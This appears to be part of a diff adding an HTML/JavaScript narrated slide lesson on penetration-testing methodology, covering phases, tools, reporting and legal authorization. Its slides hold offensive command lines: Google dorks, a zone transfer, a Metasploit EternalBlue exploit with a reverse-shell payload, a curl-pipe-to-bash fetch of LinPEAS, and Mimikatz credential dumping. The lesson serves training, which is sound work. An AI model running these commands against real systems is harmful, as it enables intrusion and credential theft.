+<div class="phase-row" style="border-color:var(--gn);background:var(--gng)"><div class="phase-num" style="background:var(--gng);color:var(--gn)">04</div><div class="phase-body"><div class="phase-name" style="color:var(--gn)">Exploitation</div><div class="phase-desc">Actively attacking vulnerabilities to gain unauthorized access</div></div><div class="phase-pct" style="color:var(--mt)">~20%</div></div>
+<div class="phase-row" style="border-color:var(--cy);background:var(--cug)"><div class="phase-num" style="background:var(--cug);color:var(--cy)">05</div><div class="phase-body"><div class="phase-name" style="color:var(--cy)">Post-Exploitation</div><div class="phase-desc">Privilege escalation, persistence, lateral movement, data extraction</div></div><div class="phase-pct" style="color:var(--mt)">~15%</div></div>
+<div class="phase-row" style="border-color:var(--pp);background:var(--ppg)"><div class="phase-num" style="background:var(--ppg);color:var(--pp)">06</div><div class="phase-body"><div class="phase-name" style="color:var(--pp)">Reporting</div><div class="phase-desc">Documenting findings, impact analysis, and prioritized remediation</div></div><div class="phase-pct" style="color:var(--mt)">~10%</div></div>
+</div>
+<div class="ab"><i class="fas fa-clock"></i><span>Reconnaissance consumes the <strong>largest time allocation</strong> (~25%) because thorough intelligence gathering directly determines the success of every subsequent phase.</span></div>`},
+
+            {
+                t: "Phase 1 — Passive Reconnaissance", lb: "Chapter 04",
+                n: "Passive reconnaissance gathers intelligence about the target without directly interacting with their systems. This leaves no footprint on the target's logs. Techniques include OSINT, Open Source Intelligence, where analysts scour public records, social media, job postings, and domain registrations. WHOIS lookups reveal domain ownership and registration details. Google Dorking uses advanced search operators to find exposed files, directories, and sensitive information indexed by search engines. Shodan searches identify internet-facing devices and their configurations.",
+                h: `<ul class="bl">
+<li><div class="d" style="background:var(--sv)"></div><span><strong style="color:var(--sv)">Zero footprint</strong> — target never knows you're gathering intelligence</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span><strong style="color:var(--sv)">OSINT</strong> — public records, social media profiles, job postings revealing tech stack</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span><strong style="color:var(--sv)">WHOIS</strong> — domain ownership, registration dates, name servers, contact information</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span><strong style="color:var(--sv)">Google Dorking</strong> — advanced operators like site: and filetype: to find exposed data</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span><strong style="color:var(--sv)">Shodan</strong> — discovers internet-facing devices, open ports, software versions</span></li>
+</ul>
+<div class="code" style="margin-top:6px"><span class="cm"># Google Dorking examples</span><br>site:target.com filetype:pdf confidential<br>site:target.com inurl:admin login<br>site:target.com intitle:"index of" /backup<br><span class="cm"># Shodan query</span><br>hostname:target.com port:443 ssl<br><span class="cm"># WHOIS lookup</span><br>whois target.com</div>`},
+
+            {
+                t: "Phase 1 — Active Reconnaissance", lb: "Chapter 05",
+                n: "Active reconnaissance directly interacts with the target's systems, which means the target's security infrastructure may log and detect this activity. Techniques include DNS enumeration to discover subdomains and DNS records, network ping sweeps to identify live hosts, and traceroute to map network topology. Tools like Nmap perform aggressive scans that are logged by firewalls and intrusion detection systems. The key trade-off is that active recon yields more detailed and accurate intelligence but risks alerting the target.",
+                h: `<div class="tc2">
+<div class="cd" style="border-color:var(--gn)"><h4 style="color:var(--gn)"><i class="fas fa-eye-slash"></i> Passive (Safe)</h4>
+<ul class="bl"><li><div class="d" style="background:var(--gn)"></div><span>No target interaction</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span>No log footprint</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span>Public sources only</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span style="color:var(--sv)">Less detailed results</span></li>
+</ul></div>
+<div class="cd" style="border-color:var(--ac)"><h4 style="color:var(--ac)"><i class="fas fa-satellite-dish"></i> Active (Risky)</h4>
+<ul class="bl"><li><div class="d"></div><span>Direct target interaction</span></li>
+<li><div class="d"></div><span style="color:var(--ac)">Logged by firewalls and IDS</span></li>
+<li><div class="d"></div><span>DNS queries, pings, scans</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span style="color:var(--gn)">More accurate, detailed data</span></li>
+</ul></div>
+</div>
+<div class="code" style="margin-top:8px"><span class="cm"># DNS Enumeration — discover subdomains</span><br>dig axfr target.com @ns1.target.com<br>host -t mx target.com<br>subfinder -d target.com<br><span class="cm"># Network sweep — find live hosts</span><br>nmap -sn 192.168.1.0/24<br><span class="cm"># Traceroute — map network path</span><br>traceroute target.com</div>
+<div class="wb"><i class="fas fa-triangle-exclamation"></i><span>Active reconnaissance <strong>will generate logs</strong>. A skilled pentester minimizes active recon footprint and maximizes passive intelligence first.</span></div>`},
+
+            {
+                t: "Phase 2 — Vulnerability Scanning", lb: "Chapter 06",
+                n: "Vulnerability scanning uses automated tools to identify open ports, running services, software versions, and known vulnerabilities on the target. Nmap is the industry standard for port scanning and service detection. Nessus and OpenVAS perform comprehensive vulnerability assessment against databases of known CVEs. The output is a prioritized list of potential weaknesses that guides the exploitation phase. However, scanners produce false positives, so every finding must be manually verified before exploitation.",
+                h: `<div class="tool-grid">
+<div class="tool-card" style="border-bottom-color:var(--ac)"><div class="tn" style="color:var(--ac)">Nmap</div><div class="tp">Port scanning, service detection, OS fingerprinting</div></div>
+<div class="tool-card" style="border-bottom-color:var(--cy)"><div class="tn" style="color:var(--cy)">Nessus</div><div class="tp">Comprehensive vulnerability assessment, CVE matching</div></div>
+<div class="tool-card" style="border-bottom-color:var(--gn)"><div class="tn" style="color:var(--gn)">OpenVAS</div><div class="tp">Open-source vulnerability scanner, 50k+ plugin tests</div></div>
+<div class="tool-card" style="border-bottom-color:var(--amb)"><div class="tn" style="color:var(--amb)">Nikto</div><div class="tp">Web server scanner, misconfigurations, dangerous files</div></div>
+<div class="tool-card" style="border-bottom-color:var(--pp)"><div class="tn" style="color:var(--pp)">Burp Suite</div><div class="tp">Web proxy, automated crawling, vulnerability scanning</div></div>
+<div class="tool-card" style="border-bottom-color:var(--sv)"><div class="tn" style="color:var(--sv)">Masscan</div><div class="tp">Ultra-fast port scanning for large network ranges</div></div>
+</div>
+<div class="code" style="margin-top:8px"><span class="cm"># Nmap comprehensive scan</span><br>nmap -sV -sC -O -p- 192.168.1.100<br><span class="cm"># -sV: version detection</span><br><span class="cm"># -sC: default scripts</span><br><span class="cm"># -O: OS detection</span><br><span class="cm"># -p-: all 65535 ports</span></div>`},
+
+            {
+                t: "Phase 3 — Enumeration Deep Dive", lb: "Chapter 07",
+                n: "Enumeration is the systematic extraction of detailed information from services discovered during scanning. This is where broad scanning transitions into targeted intelligence gathering. SMB enumeration reveals shared folders and user accounts on Windows systems. LDAP enumeration extracts organizational structure, usernames, and group memberships from Active Directory. SNMP enumeration queries network devices for configuration data using community strings. Database enumeration maps table structures and tests for weak credentials. Enumeration transforms a list of open ports into an actionable attack surface map.",
+                h: `<table class="tbl">
+<thead><tr><th>Target</th><th>Technique</th><th>Extracted Data</th></tr></thead>
+<tbody>
+<tr><td style="color:var(--ac);font-weight:600">SMB (445)</td><td>enum4linux, smbclient</td><td>Shared folders, users, groups, policies</td></tr>
+<tr><td style="color:var(--cy);font-weight:600">LDAP (389)</td><td>ldapsearch, BloodHound</td><td>AD structure, usernames, group membership, SPNs</td></tr>
+<tr><td style="color:var(--gn);font-weight:600">SNMP (161)</td><td>snmpwalk, onesixtyone</td><td>Device configs, interfaces, routing tables</td></tr>
+<tr><td style="color:var(--amb);font-weight:600">DNS (53)</td><td>dig, dnsrecon</td><td>Subdomains, mail servers, zone transfers</td></tr>
+<tr><td style="color:var(--pp);font-weight:600">Databases</td><td>sqlmap, hydra</td><td>Table names, schemas, weak credentials</td></tr>
+<tr><td style="color:var(--sv);font-weight:600">Web Apps</td><td>gobuster, ffuf</td><td>Hidden directories, admin panels, APIs</td></tr>
+</tbody></table>
+<div class="ib"><i class="fas fa-info-circle"></i><span>Enumeration is the <strong>bridge between scanning and exploitation</strong>. The quality of your enumeration directly determines the success of your exploitation phase.</span></div>`},
+
+            {
+                t: "Phase 4 — Exploitation", lb: "Chapter 08",
+                n: "Exploitation is the active phase where the pentester attacks identified vulnerabilities to gain unauthorized access. The Metasploit Framework is the primary exploitation platform, offering thousands of pre-built exploits, payloads, and encoders for known vulnerabilities. Manual exploitation techniques include crafting custom SQL injection payloads, building buffer overflow exploits, and weaponizing misconfigurations. Web application exploitation targets OWASP Top 10 vulnerabilities including injection, broken authentication, and file upload flaws. Every exploitation attempt is carefully documented with screenshots, commands, and timestamps for the final report.",
+                h: `<ul class="bl">
+<li><div class="d" style="background:var(--ac)"></div><span><strong style="color:var(--ac)">Metasploit Framework</strong> — thousands of pre-built exploits, payloads, and encoders for known CVEs</span></li>
+<li><div class="d" style="background:var(--ac)"></div><span><strong style="color:var(--ac)">Custom exploitation</strong> — hand-crafted SQLi payloads, buffer overflow exploits, reverse shells</span></li>
+<li><div class="d" style="background:var(--ac)"></div><span><strong style="color:var(--ac)">Web app exploitation</strong> — targeting OWASP Top 10: injection, auth bypass, file upload, deserialization</span></li>
+<li><div class="d" style="background:var(--ac)"></div><span><strong style="color:var(--ac)">Credential attacks</strong> — password spraying, brute-forcing, pass-the-hash, Kerberoasting</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span><strong style="color:var(--sv)">Every attempt is documented</strong> — screenshots, exact commands, timestamps, outcomes</span></li>
+</ul>
+<div class="code" style="margin-top:6px"><span class="cm"># Metasploit — exploit a known SMB vulnerability</span><br>msfconsole<br>msf6 > <span class="kw">use</span> <span class="fn">exploit/windows/smb/ms17_010_eternalblue</span><br>msf6 <span class="fn">exploit</span>(...) > <span class="kw">set</span> RHOSTS 192.168.1.100<br>msf6 <span class="fn">exploit</span>(...) > <span class="kw">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br>msf6 <span class="fn">exploit</span>(...) > <span class="kw">set</span> LHOST 192.168.1.50<br>msf6 <span class="fn">exploit</span>(...) > <span class="fn">exploit</span></div>`},
+
+            {
+                t: "Phase 5 — Post-Exploitation", lb: "Chapter 09",
+                n: "Post-exploitation begins after initial access is gained. The immediate priority is privilege escalation, elevating from a standard user to root or administrator using techniques like SUID binaries, kernel exploits, or misconfigured sudo rules. Persistence mechanisms like backdoor accounts, scheduled tasks, or rootkits ensure the pentester maintains access even if the initial exploit is patched. Lateral movement pivots through the network to access additional systems. Data exfiltration demonstrates the real-world impact by extracting sensitive information. Finally, all artifacts are cleaned up to avoid disrupting the target environment.",
+                h: `<div style="display:flex;flex-direction:column;gap:4px">
+<div class="phase-row" style="border-color:var(--amb);background:var(--amg)"><div class="phase-num" style="background:var(--amg);color:var(--amb)"><i class="fas fa-arrow-up"></i></div><div class="phase-body"><div class="phase-name" style="color:var(--amb)">Privilege Escalation</div><div class="phase-desc">SUID binaries, kernel exploits, misconfigured sudo, token impersonation</div></div></div>
+<div class="phase-row" style="border-color:var(--ac);background:var(--acg)"><div class="phase-num" style="background:var(--acg);color:var(--ac)"><i class="fas fa-anchor"></i></div><div class="phase-body"><div class="phase-name" style="color:var(--ac)">Persistence</div><div class="phase-desc">Backdoor accounts, scheduled tasks, rootkits, registry run keys</div></div></div>
+<div class="phase-row" style="border-color:var(--cy);background:var(--cug)"><div class="phase-num" style="background:var(--cug);color:var(--cy)"><i class="fas fa-arrows-left-right"></i></div><div class="phase-body"><div class="phase-name" style="color:var(--cy)">Lateral Movement</div><div class="phase-desc">Pivoting through compromised hosts, pass-the-hash, RDP hijacking</div></div></div>
+<div class="phase-row" style="border-color:var(--rd);background:rgba(229,57,53,.04)"><div class="phase-num" style="background:rgba(229,57,53,.1);color:var(--ac)"><i class="fas fa-file-export"></i></div><div class="phase-body"><div class="phase-name" style="color:var(--ac)">Data Exfiltration</div><div class="phase-desc">Extracting databases, credentials, intellectual property to demonstrate impact</div></div></div>
+<div class="phase-row" style="border-color:var(--sv);background:rgba(176,190,197,.04)"><div class="phase-num" style="background:rgba(176,190,197,.06);color:var(--sv)"><i class="fas fa-broom"></i></div><div class="phase-body"><div class="phase-name" style="color:var(--sv)">Cleanup</div><div class="phase-desc">Removing artifacts, clearing logs, restoring configurations to original state</div></div></div>
+</div>`},
+
+            {
+                t: "Post-Exploitation Tools", lb: "Chapter 10",
+                n: "Several specialized tools dominate post-exploitation operations. LinPEAS and WinPEAS are privilege escalation enumeration scripts that automatically audit Linux and Windows systems for escalation vectors. BloodHound maps Active Directory relationships to find attack paths. Mimikatz extracts plaintext passwords and hashes from Windows memory. Chisel and Ligolo-ng enable network pivoting and tunneling. PowerSploit provides PowerShell-based post-exploitation modules for Windows environments.",
+                h: `<div class="tool-grid">
+<div class="tool-card" style="border-bottom-color:var(--gn)"><div class="tn" style="color:var(--gn)">LinPEAS</div><div class="tp">Linux privilege escalation enumeration</div></div>
+<div class="tool-card" style="border-bottom-color:var(--ac)"><div class="tn" style="color:var(--ac)">WinPEAS</div><div class="tp">Windows privilege escalation enumeration</div></div>
+<div class="tool-card" style="border-bottom-color:var(--pp)"><div class="tn" style="color:var(--pp)">BloodHound</div><div class="tp">Active Directory attack path mapping</div></div>
+<div class="tool-card" style="border-bottom-color:var(--amb)"><div class="tn" style="color:var(--amb)">Mimikatz</div><div class="tp">Windows credential extraction from memory</div></div>
+<div class="tool-card" style="border-bottom-color:var(--cy)"><div class="tn" style="color:var(--cy)">Chisel</div><div class="tp">Network pivoting and tunneling</div></div>
+<div class="tool-card" style="border-bottom-color:var(--sv)"><div class="tn" style="color:var(--sv)">PowerSploit</div><div class="tp">PowerShell post-exploitation modules</div></div>
+</div>
+<div class="code" style="margin-top:8px"><span class="cm"># Privilege escalation with LinPEAS</span><br>curl <span class="sr">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span> | bash<br><span class="cm"># BloodHound — collect AD data</span><br>bloodhound-python -d target.local -u admin -p pass -ns 192.168.1.10<br><span class="cm"># Mimikatz — extract credentials</span><br>privilege::debug<br>sekurlsa::logonpasswords</div>`},
+
+            {
+                t: "Phase 6 — Professional Reporting", lb: "Chapter 11",
+                n: "The penetration testing report is the primary deliverable and often the only tangible artifact the client receives. A professional report must include an executive summary for leadership, detailing business impact in non-technical language. A technical findings section provides step-by-step reproduction instructions, screenshots, and evidence for each vulnerability. Findings are risk-rated using CVSS scores or custom severity matrices. Most importantly, every finding includes actionable remediation guidance with specific steps to fix the vulnerability, not just descriptions of what went wrong.",
+                h: `<div style="display:flex;flex-direction:column;gap:8px">
+<div class="cd" style="border-color:var(--pp)"><h4 style="color:var(--pp)"><i class="fas fa-file-lines"></i> Report Structure</h4>
+<ul class="bl"><li><div class="d" style="background:var(--pp)"></div><span><strong>Executive Summary</strong> — business impact, risk posture, key findings for leadership</span></li>
+<li><div class="d" style="background:var(--pp)"></div><span><strong>Scope & Methodology</strong> — what was tested, what was excluded, tools used</span></li>
+<li><div class="d" style="background:var(--pp)"></div><span><strong>Technical Findings</strong> — step-by-step reproduction, screenshots, evidence, CVSS scores</span></li>
+<li><div class="d" style="background:var(--pp)"></div><span><strong>Remediation Guidance</strong> — specific fix steps, not just problem descriptions</span></li>
+<li><div class="d" style="background:var(--pp)"></div><span><strong>Appendices</strong> — full scan outputs, raw data, tool configurations</span></li></ul></div>
+</div>
+<div class="wb"><i class="fas fa-triangle-exclamation"></i><span>The report is your <strong>only deliverable</strong>. A brilliant exploitation that is poorly documented is worthless to the client. Invest maximum effort in clear, actionable reporting.</span></div>`},
+
+            {
+                t: "CVSS Scoring and Risk Prioritization", lb: "Chapter 12",
+                n: "The Common Vulnerability Scoring System quantifies vulnerability severity on a scale of 0 to 10. The score is calculated from base metrics including attack vector, complexity, required privileges, and user interaction, plus impact metrics measuring confidentiality, integrity, and availability effects. Ratings range from None for score 0, through Low for 0.1 to 3.9, Medium for 4.0 to 6.9, High for 7.0 to 8.9, to Critical for 9.0 to 10.0. This standardized scoring enables clients to prioritize remediation efforts based on objective risk metrics rather than subjective assessments.",
+                h: `<table class="tbl">
+<thead><tr><th>Rating</th><th>Score Range</th><th>Characteristics</th><th>Client Action</th></tr></thead>
+<tbody>
+<tr><td style="font-weight:700;color:var(--mt)">None</td><td style="font-family:'Fira Code',monospace">0.0</td><td>No impact</td><td>Informational</td></tr>
+<tr><td style="font-weight:700;color:var(--sv)">Low</td><td style="font-family:'Fira Code',monospace">0.1 — 3.9</td><td>Minor impact, high complexity</td><td>Fix when convenient</td></tr>
+<tr><td style="font-weight:700;color:var(--amb)">Medium</td><td style="font-family:'Fira Code',monospace">4.0 — 6.9</td><td>Moderate impact, exploitable</td><td>Fix within 30 days</td></tr>
+<tr><td style="font-weight:700;color:var(--ac2)">High</td><td style="font-family:'Fira Code',monospace">7.0 — 8.9</td><td>Significant impact, easily exploitable</td><td style="color:var(--ac)">Fix within 72 hours</td></tr>
+<tr><td style="font-weight:700;color:var(--ac)">Critical</td><td style="font-family:'Fira Code',monospace">9.0 — 10.0</td><td>Catastrophic impact, trivial exploitation</td><td style="color:var(--ac);font-weight:600">Fix immediately</td></tr>
+</tbody></table>
+<div class="ib"><i class="fas fa-info-circle"></i><span>CVSS provides <strong>objective, standardized severity metrics</strong> that enable clients to make data-driven remediation decisions based on business risk, not gut feeling.</span></div>`},
+
+            {
+                t: "Legal & Ethical Framework", lb: "Chapter 13",
+                n: "Every penetration test must operate within strict legal and ethical boundaries. The most critical document is the Rules of Engagement, a signed agreement defining exact scope, permitted techniques, excluded systems, and notification procedures. Without written authorization, penetration testing activities constitute illegal computer intrusion under laws like the Computer Fraud and Abuse Act in the United States, the Computer Misuse Act in the UK, and similar legislation worldwide. Ethical pentesters never exceed defined scope, always minimize collateral damage, and protect any sensitive data encountered during testing.",
+                h: `<div class="tc2">
+<div class="cd" style="border-color:var(--gn)"><h4 style="color:var(--gn)"><i class="fas fa-file-contract"></i> Rules of Engagement</h4>
+<ul class="bl"><li><div class="d" style="background:var(--gn)"></div><span>Exact IP ranges and domains in scope</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span>Permitted attack techniques</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span>Excluded systems explicitly listed</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span>Testing window dates and times</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span>Emergency contact procedures</span></li>
+</ul></div>
+<div class="cd" style="border-color:var(--ac)"><h4 style="color:var(--ac)"><i class="fas fa-gavel"></i> Legal Consequences</h4>
+<ul class="bl"><li><div class="d"></div><span style="color:var(--ac)">CFAA (US) — up to 20 years</span></li>
+<li><div class="d"></div><span style="color:var(--ac)">Computer Misuse Act (UK)</span></li>
+<li><div class="d"></div><span style="color:var(--ac)">Similar laws in every jurisdiction</span></li>
+<li><div class="d"></div><span style="color:var(--ac)">Civil liability for damages</span></li>
+<li><div class="d"></div><span style="color:var(--ac)">Career destruction</span></li>
+</ul></div>
+</div>
+<div class="wb"><i class="fas fa-ban"></i><span><strong>Never test without written authorization.</strong> Even well-intentioned testing without a signed ROE is a criminal offense in virtually every country.</span></div>`},
+
+            {
+                t: "Engagement Types — Black, White, Gray Box", lb: "Chapter 14",
+                n: "Penetration testing engagements are categorized by the level of information provided to the tester. Black box testing simulates a real-world external attacker with zero prior knowledge. The tester must discover everything from scratch, making it the most realistic but also the most time-consuming. White box testing provides full access to source code, architecture diagrams, and credentials, focusing on thorough code-level analysis. Gray box testing provides partial information, typically network diagrams and user credentials, simulating an insider threat or an attacker with some prior intelligence.",
+                h: `<table class="tbl">
+<thead><tr><th>Attribute</th><th style="color:var(--ac)">Black Box</th><th style="color:var(--sv)">White Box</th><th style="color:var(--amb)">Gray Box</th></tr></thead>
+<tbody>
+<tr><td style="color:var(--ac);font-weight:600">Info Provided</td><td>None — zero knowledge</td><td>Full — source code, credentials, architecture</td><td>Partial — network maps, user accounts</td></tr>
+<tr><td style="color:var(--ac);font-weight:600">Simulates</td><td>External attacker</td><td>Developer or auditor</td><td>Insider threat or informed attacker</td></tr>
+<tr><td style="color:var(--ac);font-weight:600">Realism</td><td style="color:var(--gn)">Highest</td><td>Lowest</td><td>Moderate</td></tr>
+<tr><td style="color:var(--ac);font-weight:600">Time Required</td><td style="color:var(--ac)">Longest</td><td>Shortest</td><td>Moderate</td></tr>
+<tr><td style="color:var(--ac);font-weight:600">Coverage</td><td>Surface-level only</td><td style="color:var(--gn)">Deepest code-level</td><td>Balanced</td></tr>
+<tr><td style="color:var(--ac);font-weight:600">Cost</td><td style="color:var(--ac)">Highest</td><td>Lowest</td><td>Moderate</td></tr>
+</tbody></table>`},
+
+            {
+                t: "The Cyber Kill Chain Mapping", lb: "Chapter 15",
+                n: "The Lockheed Martin Cyber Kill Chain provides a military-derived framework for understanding adversary operations. It defines seven stages from initial reconnaissance through final objective completion. Mapping penetration testing phases to the Kill Chain demonstrates how professional testing mirrors real-world attack patterns. Reconnaissance maps to reconnaissance. Scanning and enumeration map to weaponization and delivery. Exploitation maps to exploitation and installation. Post-exploitation maps to command and control and actions on objectives. This mapping helps clients understand how each tested phase relates to actual threat actor behavior.",
+                h: `<div class="kill-chain">
+<div class="kc-step" style="border-left:3px solid var(--ac)"><span style="color:var(--ac);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">1. RECONNAISSANCE</span><span style="color:var(--mt)">→</span><span>Pentest Phase 1: Recon</span></div>
+<div class="kc-arrow"><i class="fas fa-chevron-down"></i></div>
+<div class="kc-step" style="border-left:3px solid var(--ac2)"><span style="color:var(--ac2);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">2. WEAPONIZATION</span><span style="color:var(--mt)">→</span><span>Pentest Phase 2-3: Scan & Enumerate</span></div>
+<div class="kc-arrow"><i class="fas fa-chevron-down"></i></div>
+<div class="kc-step" style="border-left:3px solid var(--amb)"><span style="color:var(--amb);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">3. DELIVERY</span><span style="color:var(--mt)">→</span><span>Pentest Phase 4: Exploitation</span></div>
+<div class="kc-arrow"><i class="fas fa-chevron-down"></i></div>
+<div class="kc-step" style="border-left:3px solid var(--gn)"><span style="color:var(--gn);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">4. EXPLOITATION</span><span style="color:var(--mt)">→</span><span>Pentest Phase 4: Gaining access</span></div>
+<div class="kc-arrow"><i class="fas fa-chevron-down"></i></div>
+<div class="kc-step" style="border-left:3px solid var(--cy)"><span style="color:var(--cy);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">5. INSTALLATION</span><span style="color:var(--mt)">→</span><span>Pentest Phase 5: Persistence</span></div>
+<div class="kc-arrow"><i class="fas fa-chevron-down"></i></div>
+<div class="kc-step" style="border-left:3px solid var(--pp)"><span style="color:var(--pp);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">6. COMMAND & CTRL</span><span style="color:var(--mt)">→</span><span>Pentest Phase 5: Lateral movement</span></div>
+<div class="kc-arrow"><i class="fas fa-chevron-down"></i></div>
+<div class="kc-step" style="border-left:3px solid var(--sv)"><span style="color:var(--sv);font-weight:600;min-width:120px;font-family:'Fira Code',monospace;font-size:clamp(7px,.9vw,10px)">7. ACT ON OBJECTIVES</span><span style="color:var(--mt)">→</span><span>Pentest Phase 5-6: Exfiltration & Report</span></div>
+</div>`},
+
+            {
+                t: "Conclusion — The Methodology Is Everything", lb: "Conclusion",
+                n: "The methodology is what separates professional penetration testers from chaotic script kiddies. Following a structured, repeatable process ensures no critical step is missed, findings are legally defensible, and clients receive maximum value. Reconnaissance informs scanning. Scanning informs exploitation. Exploitation informs post-exploitation. And every phase feeds the final report. Master the methodology, master the tools, respect the legal boundaries, and you will become an effective, trusted offensive security professional.",
+                h: `<div class="ts" style="text-align:left;align-items:flex-start">
+<div style="font-size:clamp(14px,2vw,22px);font-weight:700;color:var(--fg);margin-bottom:12px;line-height:1.3">The Methodology Is Everything</div>
+<ul class="bl">
+<li><div class="d" style="background:var(--ac)"></div><span><strong style="color:var(--ac)">Structured process</strong> — ensures no critical step is missed, every finding is traceable</span></li>
+<li><div class="d" style="background:var(--ac2)"></div><span><strong style="color:var(--ac2)">Each phase feeds the next</strong> — recon informs scanning, scanning informs exploitation</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span><strong style="color:var(--gn)">Legal compliance</strong> — signed ROE, defined scope, no unauthorized activity, ever</span></li>
+<li><div class="d" style="background:var(--cy)"></div><span><strong style="color:var(--cy)">Report-driven</strong> — every action documented, every finding reproducible, every fix actionable</span></li>
+<li><div class="d" style="background:var(--pp)"></div><span><strong style="color:var(--pp)">Kill Chain alignment</strong> — testing mirrors real adversary behavior for maximum defensive value</span></li>
+</ul>
+<div style="margin-top:14px;padding:12px 16px;background:rgba(229,57,53,.05);border:1px solid rgba(229,57,53,.12);border-radius:7px;font-family:'Fira Code',monospace;font-size:clamp(9px,1.1vw,12px);color:var(--ac);line-height:1.6">
+"Master the methodology.<br>Master the tools.<br>Respect the boundaries.<br>Deliver the truth."
+</div>
+</div>`}
+        ];
+
+        const st2 = { cur: 0, play: false, up: false, spd: 1, vol: 1, mut: false, start: false, ss: 0, se: 0, pt: null, utt: null };
+        D.forEach(s => { s.w = s.n.split(/\s+/).length; s.dur = (s.w / 140) * 60 });
+        const totD2 = D.reduce((a, s) => a + s.dur, 0);
+        const $ = id => document.getElementById(id);
+        const sa2 = $('sa2'), pl3 = $('pl3'), pli2 = $('pli2'), pv2 = $('pv2'), nx2 = $('nx2'), pw4 = $('pw4'), pf3 = $('pf3'), td2 = $('td2'), ss3 = $('ss3'), vs3 = $('vs3'), vb2 = $('vb2'), vi2 = $('vi2'), ct2 = $('ct2'), cp2 = $('cp2'), cl2 = $('cl2'), io3 = $('io3'), eo3 = $('eo3'), sbt2 = $('sbt2'), rbt2 = $('rbt2'), si3 = $('si3'), ti2 = $('ti2'), tst3 = $('tst3');
+
+        function fmt2(s) { const m = Math.floor(s / 60).toString().padStart(2, '0'), sc = Math.floor(s % 60).toString().padStart(2, '0'); return m + ':' + sc }
+        function toast2(m) { tst3.textContent = m; tst3.classList.add('sh'); setTimeout(() => tst3.classList.remove('sh'), 2200) }
+        function getEl2() { let t = 0; for (let i = 0; i < st2.cur; i++)t += D[i].dur; t += st2.se; return t }
+
+        function buildS() { sa2.innerHTML = ''; D.forEach((s, i) => { const d = document.createElement('div'); d.className = 'sl' + (i === 0 ? ' on' : ''); d.id = 's2-' + i; d.innerHTML = `<div class="slb">${s.lb}</div><div class="slt">${s.t}</div><div class="sbd">${s.h}</div>`; sa2.appendChild(d) }) }
+        function buildC() { cl2.innerHTML = ''; D.forEach((s, i) => { const d = document.createElement('div'); d.className = 'ci' + (i === 0 ? ' on' : ''); d.innerHTML = `<span class="nm">${i + 1}</span><span class="label">${s.t}</span>`; d.addEventListener('click', () => seek2(i)); cl2.appendChild(d) }) }
+
+        function render2(idx, dir = 'next') {
+            const prev = sa2.querySelector('.sl.on'), next = $('s2-' + idx);
+            if (!next || prev === next) return;
+            if (prev) { prev.classList.remove('on'); prev.classList.add(dir === 'next' ? 'ex' : ''); setTimeout(() => prev.classList.remove('ex'), 420) }
+            next.classList.add('on');
+            next.querySelectorAll('.bl li').forEach((li, i) => { li.style.animation = 'none'; li.offsetHeight; li.style.animationDelay = (i * .1) + 's'; li.style.animation = '' });
+            cl2.querySelectorAll('.ci').forEach((e, i) => e.classList.toggle('on', i === idx));
+            ti2.textContent = D[idx].t; st2.se = 0; upd2();
+        }
+
+        function spk(txt) {
+            if (!('speechSynthesis' in window)) { toast2('TTS not supported'); return }
+            speechSynthesis.cancel();
+            const u = new SpeechSynthesisUtterance(txt); u.rate = st2.spd; u.pitch = 1; u.volume = st2.mut ? 0 : st2.vol;
+            const v = speechSynthesis.getVoices();
+            const p = v.find(x => x.lang.startsWith('en') && x.name.includes('Google')) || v.find(x => x.lang.startsWith('en') && x.localService) || v.find(x => x.lang.startsWith('en'));
+            if (p) u.voice = p;
+            u.onend = () => { if (!st2.up && st2.play) { if (st2.cur < D.length - 1) nxt2(); else { stp2(); eo3.classList.add('vis') } } si3.classList.remove('vis') };
+            u.onerror = e => { if (e.error !== 'canceled') si3.classList.remove('vis') };
+            st2.utt = u; speechSynthesis.speak(u); si3.classList.add('vis');
+        }
+
+        function doP() { st2.play = true; st2.up = false; st2.ss = Date.now() - (st2.se * 1000); pli2.className = 'fas fa-pause'; spk(D[st2.cur].n); startPT2() }
+        function doPa() { st2.up = true; st2.play = false; st2.se = (Date.now() - st2.ss) / 1000; pli2.className = 'fas fa-play'; speechSynthesis.pause(); si3.classList.remove('vis'); stopPT2() }
+        function togP() { if (!st2.start) return; st2.play ? doPa() : doP() }
+        function nxt2() { if (st2.cur >= D.length - 1) return; speechSynthesis.cancel(); st2.cur++; render2(st2.cur, 'next'); if (st2.play) { st2.ss = Date.now(); st2.se = 0; spk(D[st2.cur].n) } else upd2() }
+        function prv2() { if (st2.cur <= 0) return; speechSynthesis.cancel(); si3.classList.remove('vis'); const w = st2.play; st2.play = false; st2.cur--; st2.se = 0; render2(st2.cur, 'prev'); upd2(); if (w) setTimeout(() => doP(), 100) }
+        function seek2(idx) { if (idx === st2.cur) return; speechSynthesis.cancel(); si3.classList.remove('vis'); const w = st2.play; st2.play = false; st2.cur = idx; st2.se = 0; render2(idx); upd2(); if (w) setTimeout(() => doP(), 100) }
+        function stp2() { st2.play = false; st2.up = false; pli2.className = 'fas fa-play'; speechSynthesis.cancel(); si3.classList.remove('vis'); stopPT2() }
+        function startPT2() { stopPT2(); st2.pt = setInterval(() => { st2.se = (Date.now() - st2.ss) / 1000; upd2() }, 200) }
+        function stopPT2() { if (st2.pt) { clearInterval(st2.pt); st2.pt = null } }
